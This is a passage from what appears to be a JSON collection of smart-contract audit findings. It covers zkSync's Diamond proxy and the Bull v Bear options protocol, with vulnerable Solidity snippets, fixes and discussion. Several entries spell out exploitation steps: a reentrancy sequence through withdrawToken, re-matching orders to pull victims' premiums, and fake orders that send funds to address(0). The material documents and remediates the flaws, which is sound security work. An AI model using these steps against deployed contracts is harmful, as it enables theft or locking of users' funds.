      "content": "In the [`DiamondProxy`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/DiamondProxy.sol) contract, a selector is mapped to a facet via the mapping [`diamondStorage.selectorToFacet`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/DiamondProxy.sol#L23) upon executing the `fallback` function. The received datastructure of type `Diamond.SelectorToFacet` contains the information\n\n\n\n\n```\naddress facetAddress, uint16 selectorPosition, bool isFreezable\n\n```\n\n\nThe flag `isFreezable` is [used to](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/DiamondProxy.sol#L27) determine whether the `delegatecall` of the given selector to the respective facet should be executed.\n\n\nAt the same time, it is the stated intent of the system to allow freezability on the granularity level of facets: While the Diamond shall have a global flag to determine whether it is frozen or not. Each facet shall be marked as either freezable or not.\n\n\nAn issue arises, because the `selectorToFacet` mapping allows different values for the flag `isFreezable` for different selectors of *the same facet*. Which would allow for freezability on the granularity of selectors instead of facets. Consider the following example of two different selectors, one freezable, one not, belonging to the same facet:\n\n\n\n\n```\nselectorToFacet[selector1] = SelectorToFacet(facet1, 0, true)\nselectorToFacet[selector2] = SelectorToFacet(facet1, 1, false)\n\n```\n\n\nMoreover, the initialization of the `selectorToFacet` mapping within the `Diamond` library in function [`diamondCut`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L65) actually allows the assignment of different values for `isFreezable`. Consider the following example for the `facetCuts` array:\n\n\n\n\n```\n[ (facet1, Add, true, [selector1]), (facet1, Add, false, [selector2]) ]\n\n```\n\n\nwhich will lead to an initialization of the `selectorToFacet` mapping given in the example above.\n\n\nTo prevent selector-level granularity of the freezabilitiy property, consider removing the `isFreezable` property from the `Diamond.SelectorToFacet` datatype and add it to a datatype describing only the facet thereby establishing a 1:1 mapping between facet and freezability.\n\n\n**Update:** *Fixed in commit [`e39eb07`](https://github.com/matter-labs/zksync-2-dev/commit/e39eb07b936cb176b106bd31402b60c330d8bc00).*",
      "summary": "\nA bug was found in the DiamondProxy contract, which allowed for freezability on the granularity level of selectors instead of facets. The issue was that the mapping selectorToFacet contained the information address facetAddress, uint16 selectorPosition, and bool isFreezable, and the flag isFreezable was used to determine whether the delegatecall of the given selector to the respective facet should be executed. The initialization of the selectorToFacet mapping within the Diamond library allowed for different values for isFreezable for different selectors of the same facet. This would allow for freezability on the granularity of selectors instead of facets. \n\nIn order to prevent selector-level granularity of the freezabilitiy property, the isFreezable property was removed from the Diamond.SelectorToFacet datatype and added to a datatype describing only the facet. This established a 1:1 mapping between facet and freezability. The bug was fixed in commit e39eb07b936cb176b106bd31402b60c330d8bc00.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10462",
      "title": "Corruption of facets array on selector replacement",
      "impact": "MEDIUM",
      "content": "The [`Diamond` library](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol) allows replacing a selector’s facet with itself which is non-compliant with [EIP-2535](https://eips.ethereum.org/EIPS/eip-2535#addingreplacingremoving-functions).\n\n\nMoreover, an edge-case in which a facet only has one selector and this selector’s facet is replaced with itself leads to corruption of the `DiamondStorage.facets` array. Consider the following scenario:\n\n\n1. A facet has an array of selectors containing only one element `[s1]`. Through the function `diamondCut` a call to `_replaceFunctions` is initiated.\n2. Inside of [`_replaceFunctions`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L119), the call to [`_saveFacetIfNew`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L129) does not add any facet, because the facet is already registered.\n3. [Inside of the loop](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L131) iterating through the selector array `[s1]`, the call to [`_removeOneFunction`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L136) triggers a call to `_removeFacet` due to the last selector being removed. This in turn removes the facet from the `ds.facets` array.\n4. The subsequent call to [`_addOneFunction`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L137) adds selector `s1` back to the facet, while the facet remains deleted from the `ds.facets` array, thereby corrupting it.\n\n\nTo be fully compliant with the EIP-2535 spec and mitigate the edge-case leading to a corruption of the facets array, consider adding the requirement that `_facet` and `oldFacet.facetAddress` are distinct from each other.\n\n\n**Update:** *Fixed in commit [`f6cde78`](https://github.com/matter-labs/zksync-2-dev/commit/f6cde78d6dbe49aaac4aebefa103b348f1e8b795). The team mitigated this edge-case by rearranging the code. However, with the missing distinction check, the implementation is not fully EIP-2535 compliant.*",
      "summary": "\nA bug was discovered in the Diamond library, which allows replacing a selector’s facet with itself. This is not compliant with the EIP-2535 spec. Additionally, an edge-case in which a facet only has one selector and this selector’s facet is replaced with itself leads to corruption of the DiamondStorage.facets array.\n\nTo be fully compliant with the EIP-2535 spec and mitigate the edge-case, the team added the requirement that _facet and oldFacet.facetAddress are distinct from each other. This bug was fixed in the commit f6cde78d6dbe49aaac4aebefa103b348f1e8b795. The team rearranged the code to mitigate the edge-case, but the implementation is still not fully EIP-2535 compliant.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "3712",
      "title": "M-2: Bulls that are unable to receive NFTs will not be able to claim them later",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/4 \n\n## Found by \nGimelSec, bin2chen, 0xadrii, rvierdiiev, cccz, obront, 0xmuxyz, carrot, hansfriese, WATCHPUG\n\n## Summary\n\nA lot of care has been taken to ensure that, if a bull has a contract address that doesn't accept ERC721s, the NFT is saved to `withdrawableCollectionTokenId` for later withdrawal. However, because there is no way to withdraw this token to a different address (and the original address doesn't accept NFTs), it will never be able to be claimed.\n\n## Vulnerability Detail\n\nTo settle a contract, the bear calls `settleContract()`, which sends their NFT to the bull, and withdraws the collateral and premium to the bear.\n\n```solidity\ntry IERC721(order.collection).safeTransferFrom(bear, bull, tokenId) {}\ncatch (bytes memory) {\n    // Transfer NFT to BvbProtocol\n    IERC721(order.collection).safeTransferFrom(bear, address(this), tokenId);\n    // Store that the bull has to retrieve it\n    withdrawableCollectionTokenId[order.collection][tokenId] = bull;\n}\n\nuint bearAssetAmount = order.premium + order.collateral;\nif (bearAssetAmount > 0) {\n    // Transfer payment tokens to the Bear\n    IERC20(order.asset).safeTransfer(bear, bearAssetAmount);\n}\n```\nIn order to address the case that the bull is a contract that can't accept NFTs, the protocol uses a try-catch setup. If the transfer doesn't succeed, it transfers the NFT into the contract, and sets `withdrawableCollectionTokenId` so that the specific NFT is attributed to the bull for later withdrawal.\n\nHowever, assuming the bull isn't an upgradeable contract, this withdrawal will never be possible, because their only option is to call the same function `safeTransferFrom` to the same contract address, which will fail in the same way.\n\n```solidity\nfunction withdrawToken(bytes32 orderHash, uint tokenId) public {\n    address collection = matchedOrders[uint(orderHash)].collection;\n\n    address recipient = withdrawableCollectionTokenId[collection][tokenId];\n\n    // Transfer NFT to recipient\n    IERC721(collection).safeTransferFrom(address(this), recipient, tokenId);\n\n    // This token is not withdrawable anymore\n    withdrawableCollectionTokenId[collection][tokenId] = address(0);\n\n    emit WithdrawnToken(orderHash, tokenId, recipient);\n}\n```\n\n## Impact\n\nIf a bull is a contract that can't receive NFTs, their orders will be matched, the bear will be able to withdraw their assets, but the bull's NFT will remain stuck in the BVB protocol contract.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L394-L406\n\nhttps://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L450-L462\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThere are a few possible solutions:\n- Add a `to` field in the `withdrawToken` function, which allows the bull to withdraw the NFT to another address\n- Create a function similar to `transferPosition` that can be used to transfer owners of a withdrawable NFT\n- Decide that you want to punish bulls who aren't able to receive NFTs, in which case there is no need to save their address or implement a `withdrawToken` function\n\n## Discussion\n\n**datschill**\n\nPR fixing another issue, removing the withdrawToken() method : https://github.com/BullvBear/bvb-solidity/pull/14\n\n**datschill**\n\nThis issue isn't High, because in the default behavior, no smart contract can match an Order. So for a Bull to be a smart contract, the user needs to match an order (as a maker or a taker) with an EOA, then transfer his position to a smart contract. This would be kind of a poweruser move, so we consider that he should be aware that his smart contract should handle NFT reception.\nWhatsoever, the issue is fixed thanks to the PR#14, the user will be able to transfer his position to whatever EOA or smart contract he wants before calling reclaimContract() to retrieve ERC20 assets or ERC721.",
      "summary": "\nThis bug report is about an issue found in the BullvBear protocol, which is a decentralized exchange protocol. The issue is that if a bull has a contract address that doesn't accept ERC721s (Non-Fungible Tokens), the NFT is saved to `withdrawableCollectionTokenId` for later withdrawal. However, because there is no way to withdraw this token to a different address (and the original address doesn't accept NFTs), it will never be able to be claimed. \n\nThis vulnerability was found by GimelSec, bin2chen, 0xadrii, rvierdiiev, cccz, obront, 0xmuxyz, carrot, hansfriese, and WATCHPUG. The issue was found through manual review.\n\nThe impact of this issue is that if a bull is a contract that can't receive NFTs, their orders will be matched, the bear will be able to withdraw their assets, but the bull's NFT will remain stuck in the BVB protocol contract.\n\nThere are a few possible solutions to this issue, such as adding a `to` field in the `withdrawToken` function, which allows the bull to withdraw the NFT to another address; creating a function similar to `transferPosition` that can be used to transfer owners of a withdrawable NFT; or deciding that you want to punish bulls who aren't able to receive NFTs, in which case there is no need to save their address or implement a `withdrawToken` function. The issue has been fixed with the PR#14, which allows users to transfer their positions to whatever EOA or smart contract they want before calling reclaimContract() to retrieve ERC20 assets or ERC721.",
      "quality_score": 5,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bull v Bear",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/4",
      "tags": [],
      "finders": [
        "cccz",
        "bin2chen",
        "WATCHPUG",
        "0xmuxyz",
        "hansfriese",
        "0xadrii",
        "rvierdiiev",
        "obront",
        "GimelSec",
        "carrot"
      ]
    },
    {
      "id": "3711",
      "title": "M-1: It doesn't handle fee-on-transfer/deflationary tokens",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/130 \n\n## Found by \nGimelSec, dipp, tives, Ruhum, rvierdiiev, cccz, Zarf, 0v3rf10w, Tomo, hansfriese, pashov\n\n## Summary\n\nThe protocol doesn't handle fee-on-transfer/deflationary tokens, users will be unable to call `settleContract` and `reclaimContract` due to not enough assets in the contract.\nThough the protocol uses `allowedAsset` to set the asset as supported as payment, we can't guarantee that the allowed non-deflationary token will always not become a deflationary token, especially upgradeable tokens (for example, USDC).\n\n## Vulnerability Detail\n\nAssume that A token is a deflationary token, and it will take 50% fee when transferring tokens. And the protocol only set 4% fee.\n\nIf a user is bear and call `mathOrder` with `order.premium = 100`, the `takerPrice` will be `100 + 100*4% = 104` but the protocol will only get `104 * 50% = 52` tokens in [L354](https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L354). \nSame problem in `order.collateral`, the user will be unable to call `settleContract` because the contract doesn't have enough A tokens.\n\n## Impact\n\nThe protocol will be unable to pay enough tokens to users when users want to call `settleContract` or `reclaimContract`.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L354\nhttps://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L358\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse `balanceAfter - balanceBefore`:\n\n```solidity\n    uint256 balanceBefore = deflationaryToken.balanceOf(address(this));\n    deflationaryToken.safeTransferFrom(msg.sender, address(this), takerPrice);\n    uint256 balanceAfter = deflationaryToken.balanceOf(address(this));\n    premium = (balanceAfter - balanceBefore) - bearFees;\n```\n\n## Discussion\n\n**datschill**\n\nPR fixing this issue : https://github.com/BullvBear/bvb-solidity/pull/8",
      "summary": "\nThis bug report is about an issue found in the BvB Protocol, which is unable to handle fee-on-transfer/deflationary tokens. This issue was found by GimelSec, dipp, tives, Ruhum, rvierdiiev, cccz, Zarf, 0v3rf10w, Tomo, hansfriese, and pashov. \n\nThe problem is that when a user calls `mathOrder` with `order.premium = 100` and the protocol only sets 4% fee, the `takerPrice` will be 104 but the protocol will only get 52 tokens. This same problem occurs with `order.collateral`, where the user is unable to call `settleContract` because the contract doesn't have enough tokens. \n\nThe impact of this issue is that the protocol will be unable to pay enough tokens to users when they want to call `settleContract` or `reclaimContract`. The code snippets affected by this issue are located at https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L354 and https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L358. \n\nThe recommendation to fix this issue is to use `balanceAfter - balanceBefore` and the PR fixing this issue can be found at https://github.com/BullvBear/bvb-solidity/pull/8.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bull v Bear",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/130",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "pashov",
        "cccz",
        "Zarf",
        "Ruhum",
        "hansfriese",
        "dipp",
        "0v3rf10w",
        "tives",
        "rvierdiiev",
        "GimelSec",
        "Tomo"
      ]
    },
    {
      "id": "3710",
      "title": "H-4: Reentrancy in `withdrawToken()` May Delete The Next User's Balance",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/88 \n\n## Found by \nbin2chen, 0x4non, kirk-baird, Zarf, ak1, 0xSmartContract, carrot, neumo\n\n## Summary\n\nThe function `withdrawToken()` does not have a reentrancy guard and calls an external contract. It is possible to reenter `settleContract()` to spend the same token that was just transferred out. If the `safeTransferFrom()` in `settleContract()` fails then the token balance is added to the bull. However, when `withdrawToken()` continues execution it will delete the balance of the bull.\n\n## Vulnerability Detail\n\n`withdrawToken()` makes a state change to `withdrawableCollectionTokenId[collection][tokenId]`  after it makes an external call to an ERC721 contract `safeTransferFrom()`. Since this external call will relinquish control to the `to` address which is `recipient`, the `recipient` smart contract may reenter `settleContract()`.\n\nWhen calling `settleContract()` set the `tokenId` function parameter to the same one just transferred in `withdawToken()`. If transfer to the `bull` fails then the token is instead transferred to `BvbProtocol` and balance added to the bull, `withdrawableCollectionTokenId[order.collection][tokenId] = bull`\n\nAfter `settleContract()` finishes executing control will revert back to `withdrawToken()` which then executes the line `withdrawableCollectionTokenId[collection][tokenId] = address(0)`. The balance of the bull is therefore delete for that token.\n\ne.g. If we know a transfer will fail to a bull in a matched order we can a) create a fake order with ourselves b) reenter from `withdrawToken()` into `settleContract()` and therefore delete the bulls  `withdrawableCollectionTokenId` balance.\nSteps:\n- `BvpProtocol.matchOrder(orderA)` create a fake order (A)  with ones self\n- `BvpProtocol.settleOrder(orderA)` settle the fake order (A) with ones self and ensure the ERC721 transfer from bull to bear fails.\n- `BvpProtocol.matchOrder(orderB)` match the real order (B), this can be done at any time\n- `BvbProtocol.withdrawToken(orderA, token1)`  the following setups happen during line #456\n  - `ERC721(collection).safeTransferFrom(this, recipient, tokenId)` (`recipient` is bull from the fake order (A))\n  - `recipient.onERC721Received()` called by `safeTransferFrom()` and gives execution control to `receipient`\n  - `BvpProtocol.settleOrder(orderB, token1)` reenter to settle the real order using `token1` which does `withdrawableCollectionTokenId[order.collection][tokenId] = bull`\n- Finish executing `BvbProtocol.withdrawToken(orderA, token1)`  after line #456 which does `withdrawableCollectionTokenId[collection][tokenId] = address(0)`\n  \n## Impact\n\nIf we know a transfer is going to fail to a `bull` for an ERC721 we can ensure the NFT is locked in the `BvbProtocol` contract. This NFT will be unrecoverable.\n\n## Code Snippet\n[withdrawToken()](https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L450-L462)\n```solidity\n    function withdrawToken(bytes32 orderHash, uint tokenId) public {\n        address collection = matchedOrders[uint(orderHash)].collection;\n\n        address recipient = withdrawableCollectionTokenId[collection][tokenId];\n\n        // Transfer NFT to recipient\n        IERC721(collection).safeTransferFrom(address(this), recipient, tokenId);\n\n        // This token is not withdrawable anymore\n        withdrawableCollectionTokenId[collection][tokenId] = address(0);\n```\n\n[settleContract()](https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L374-L411)\n```solidity\n    function settleContract(Order calldata order, uint tokenId) public nonReentrant {\n        bytes32 orderHash = hashOrder(order);\n\n        // ContractId\n        uint contractId = uint(orderHash);\n\n        address bear = bears[contractId];\n\n        // Check that only the bear can settle the contract\n        require(msg.sender == bear, \"ONLY_BEAR\");\n\n        // Check that the contract is not expired\n        require(block.timestamp < order.expiry, \"EXPIRED_CONTRACT\");\n\n        // Check that the contract is not already settled\n        require(!settledContracts[contractId], \"SETTLED_CONTRACT\");\n\n        address bull = bulls[contractId];\n\n        // Try to transfer the NFT to the bull (needed in case of a malicious bull that block transfers)\n        try IERC721(order.collection).safeTransferFrom(bear, bull, tokenId) {}\n        catch (bytes memory) {\n            // Transfer NFT to BvbProtocol\n            IERC721(order.collection).safeTransferFrom(bear, address(this), tokenId);\n            // Store that the bull has to retrieve it\n            withdrawableCollectionTokenId[order.collection][tokenId] = bull;\n        }\n\n        uint bearAssetAmount = order.premium + order.collateral;\n        if (bearAssetAmount > 0) {\n            // Transfer payment tokens to the Bear\n            IERC20(order.asset).safeTransfer(bear, bearAssetAmount);\n        }\n\n        settledContracts[contractId] = true;\n\n        emit SettledContract(orderHash, tokenId, order);\n    }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI recommend both of these solutions though either one will be sufficient on its own:\n- Add `nonReentrant` modifier to `withdrawToken()`\n- Set `withdrawableCollectionTokenId[collection][tokenId] = address(0)` before performing `IERC721(collection).safeTransferFrom(address(this), recipient, tokenId)` to apply the checks-effects-interactions pattern.\n\n## Discussion\n\n**datschill**\n\nPR fixing checks-effects-interactions pattern : https://github.com/BullvBear/bvb-solidity/pull/15\n\n**datschill**\n\nPR fixing another issue, removing the withdrawToken() method : https://github.com/BullvBear/bvb-solidity/pull/14",
      "summary": "\nThis bug report is about the function `withdrawToken()` in the BvbProtocol contract. This function does not have a reentrancy guard and calls an external contract. It is possible to reenter `settleContract()` to spend the same token that was just transferred out. If the `safeTransferFrom()` in `settleContract()` fails then the token balance is added to the bull. However, when `withdrawToken()` continues execution it will delete the balance of the bull. \n\nThe bug occurs when `withdrawToken()` makes a state change to `withdrawableCollectionTokenId[collection][tokenId]`  after it makes an external call to an ERC721 contract `safeTransferFrom()`. Since this external call will relinquish control to the `to` address which is `recipient`, the `recipient` smart contract may reenter `settleContract()`.\n\nThe impact of this bug is that if someone knows a transfer will fail to a `bull` for an ERC721 they can ensure the NFT is locked in the `BvbProtocol` contract. This NFT will be unrecoverable.\n\nThe bug was found by bin2chen, 0x4non, kirk-baird, Zarf, ak1, 0xSmartContract, carrot, neumo and the code snippets can be found in the source link.\n\nThe recommended solutions to fix this bug are to add `nonReentrant` modifier to `withdrawToken()` and to set `withdrawableCollectionTokenId[collection][tokenId] = address(0)` before performing `IERC721(collection).safeTransferFrom(address(this), recipient, tokenId)` to apply the checks-effects-interactions pattern. There are two PRs that have been made to fix these issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bull v Bear",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/88",
      "tags": [],
      "finders": [
        "carrot",
        "bin2chen",
        "Zarf",
        "0xSmartContract",
        "kirk-baird",
        "ak1",
        "neumo",
        "0x4non"
      ]
    },
    {
      "id": "3709",
      "title": "H-3: Bull can prevent `settleContract()`",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/111 \n\n## Found by \nBahurum, KingNFT, ak1, ElKu, WATCHPUG\n\n## Summary\n\nThe bull can intentionally cause out-of-gas and revert the transaction and prevent `settleContract()`.\n\n## Vulnerability Detail\n\nAs `IERC721(order.collection).safeTransferFrom()` is used in `settleContract()` which will call `IERC721Receiver(to).onERC721Received()` when the `to` address is an contract. \n\nThis gives the bull a chance to intentionally prevent the transaction from happening by consuming a lot of gas and revert the whole transaction.\n\n## Impact\n\nThe bear (victim) can not `settleContract()` therefore cannot exercise their put option rights. The bull (attacker) always wins.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L374-L411\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n```diff\nfunction settleContract(Order calldata order, uint tokenId) public nonReentrant {\n    bytes32 orderHash = hashOrder(order);\n\n    // ContractId\n    uint contractId = uint(orderHash);\n\n    address bear = bears[contractId];\n\n    // Check that only the bear can settle the contract\n    require(msg.sender == bear, \"ONLY_BEAR\");\n\n    // Check that the contract is not expired\n    require(block.timestamp < order.expiry, \"EXPIRED_CONTRACT\");\n\n    // Check that the contract is not already settled\n    require(!settledContracts[contractId], \"SETTLED_CONTRACT\");\n\n    address bull = bulls[contractId];\n\n-    // Try to transfer the NFT to the bull (needed in case of a malicious bull that block transfers)\n-    try IERC721(order.collection).safeTransferFrom(bear, bull, tokenId) {}\n-    catch (bytes memory) {\n        // Transfer NFT to BvbProtocol\n        IERC721(order.collection).safeTransferFrom(bear, address(this), tokenId);\n        // Store that the bull has to retrieve it\n        withdrawableCollectionTokenId[order.collection][tokenId] = bull;\n-    }\n\n    uint bearAssetAmount = order.premium + order.collateral;\n    if (bearAssetAmount > 0) {\n        // Transfer payment tokens to the Bear\n        IERC20(order.asset).safeTransfer(bear, bearAssetAmount);\n    }\n\n    settledContracts[contractId] = true;\n\n    emit SettledContract(orderHash, tokenId, order);\n}\n```\n\n## Discussion\n\n**datschill**\n\nPR fixing this issue : https://github.com/BullvBear/bvb-solidity/pull/14",
      "summary": "\nThis bug report concerns the `settleContract()` function in the BvbProtocol.sol file. It was found by Bahurum, KingNFT, ak1, ElKu, and WATCHPUG. The issue is that the bull can intentionally cause out-of-gas and revert the transaction and prevent `settleContract()`. This is possible because `IERC721(order.collection).safeTransferFrom()` is used in `settleContract()` which calls `IERC721Receiver(to).onERC721Received()` when the `to` address is an contract. This means the bull can use up all the gas to prevent the transaction from happening. As a result, the bear (victim) cannot `settleContract()` and cannot exercise their put option rights, and the bull (attacker) always wins. The code snippet and recommendation for a fix are included in the report. A Pull Request (PR) has already been created to fix the issue.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bull v Bear",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/111",
      "tags": [
        "DOS",
        "Gas Limit"
      ],
      "finders": [
        "Bahurum",
        "ElKu",
        "WATCHPUG",
        "KingNFT",
        "ak1"
      ]
    },
    {
      "id": "3708",
      "title": "H-2: Bull can `transferPosition()` to `address(0)` and the original order can be matched again",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/114 \n\n## Found by \nGimelSec, dipp, aviggiano, Bahurum, bin2chen, curiousapple, imare, KingNFT, rvierdiiev, 0x52, carrot, hansfriese, WATCHPUG, neumo\n\n## Summary\n\nUsing `bulls[uint(orderHash)] == address(0)` to check whether the order is matched is insufficient, the bull can `transferPosition` to `address(0)` and the order can be matched again.\n\n## Vulnerability Detail\n\nAn order must not be matched more than once.\n\nThere is a check presented in the current implementation to prevent that: L760 `require(bulls[uint(orderHash)] == address(0), \"ORDER_ALREADY_MATCHED\");`.\n\nHowever, this check can be easily bypassed by the bull, as they can `transferPosition()` to `address(0)` anytime.\n\nThen the original order can be matched again.\n\n## Impact\n\nAttacker can match the orders by bear makers multiple times, pulling `order.premium + bearFees` from the victims' wallet as many times as they want.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L734-L761\n\nhttps://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L521-L538\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider using `matchedOrders[contractId]` to check if the order has been matched or not. Also, consider disallowing `transferPosition()` to `address(0)`.\n\n## Discussion\n\n**datschill**\n\nPR fixing this issue : https://github.com/BullvBear/bvb-solidity/pull/1\n\n**datschill**\n\nPR fixing the transfer to 0x0 : https://github.com/BullvBear/bvb-solidity/pull/3",
      "summary": "\nThis bug report is about the BullvBear Protocol, a decentralized trading platform. The bug is that the bull can transferPosition() to address(0) and the original order can be matched again. This is a vulnerability because an order should not be matched more than once.\n\nThe vulnerability was found by GimelSec, dipp, aviggiano, Bahurum, bin2chen, curiousapple, imare, KingNFT, rvierdiiev, 0x52, carrot, hansfriese, WATCHPUG, and neumo. The code snippet relevant to the issue is located at BvbProtocol.sol#L734-L761 and BvbProtocol.sol#L521-L538. The tool used to find the issue was manual review.\n\nThe impact of this vulnerability is that the attacker can match the orders of the bear makers multiple times, pulling order.premium + bearFees from the victims' wallet as many times as they want.\n\nThe recommendation to fix this issue is to consider using matchedOrders[contractId] to check if the order has been matched or not. Additionally, consider disallowing transferPosition() to address(0).\n\nThe discussion section of the report includes a link to a pull request fixing the issue, and a link to a pull request fixing the transfer to 0x0.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bull v Bear",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/114",
      "tags": [
        "Validation"
      ],
      "finders": [
        "curiousapple",
        "0x52",
        "Bahurum",
        "rvierdiiev",
        "aviggiano",
        "bin2chen",
        "WATCHPUG",
        "KingNFT",
        "hansfriese",
        "dipp",
        "imare",
        "neumo",
        "GimelSec",
        "carrot"
      ]
    },
    {
      "id": "3707",
      "title": "H-1: Attackers can use `reclaimContract()` to transfer assets in protocol to address(0)",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bullvbear-judging/issues/127 \n\n## Found by \nGimelSec, bin2chen, Ruhum, kirk-baird, \\_\\_141345\\_\\_, 0x52, carrot, hansfriese\n\n## Summary\n\n`reclaimContract()` would transfer payment tokens to `bulls[contractId]`. An attacker can make `reclaimContract()` transfer assets to address(0).\n\n## Vulnerability Detail\n\nAn attacker can use a fake order to trick `reclaimContract()`. The fake order needs to meet the following requirements:\n \n* `block.timestamp > order.expiry`. \n* `!settledContracts[contractId]`. \n* `!reclaimedContracts[contractId],`.\n\nThe first one is easy to fulfilled, an attacker can decide the content of the fake order. And the others are all satisfied since the fake order couldn’t be settled or reclaimed before.\n\nThus, `reclaimContract()` would run this line: `IERC20(order.asset).safeTransfer(bull, bullAssetAmount);`. `bull` is address(0) since `bulls[contractId]` hasn’t been filled. If `order.asset`’s implementation doesn’t make sure `to != address(0)`(e.g., https://github.com/ConsenSys/Tokens/blob/fdf687c69d998266a95f15216b1955a4965a0a6d/contracts/eip20/EIP20.sol). The asset would be sent to address(0).\n\n\n```solidity\n    function reclaimContract(Order calldata order) public nonReentrant {\n        bytes32 orderHash = hashOrder(order);\n\n        // ContractId\n        uint contractId = uint(orderHash);\n\n        address bull = bulls[contractId];\n\n        // Check that the contract is expired\n        require(block.timestamp > order.expiry, \"NOT_EXPIRED_CONTRACT\");\n\n        // Check that the contract is not settled\n        require(!settledContracts[contractId], \"SETTLED_CONTRACT\");\n\n        // Check that the contract is not reclaimed\n        require(!reclaimedContracts[contractId], \"RECLAIMED_CONTRACT\");\n\n        uint bullAssetAmount = order.premium + order.collateral;\n        if (bullAssetAmount > 0) {\n            // Transfer payment tokens to the Bull\n            IERC20(order.asset).safeTransfer(bull, bullAssetAmount);\n        }\n\n        reclaimedContracts[contractId] = true;\n\n        emit ReclaimedContract(orderHash, order);\n    }\n```\n\n## Impact\n\nAn attacker can use this vulnerability to transfer assets from BvB to address(0). It results in serious loss of funds.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L417-L443\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThere are multiple solutions for this problem.\n\n1. check `bulls[contractId] != address(0)`\n2. check the order is matched 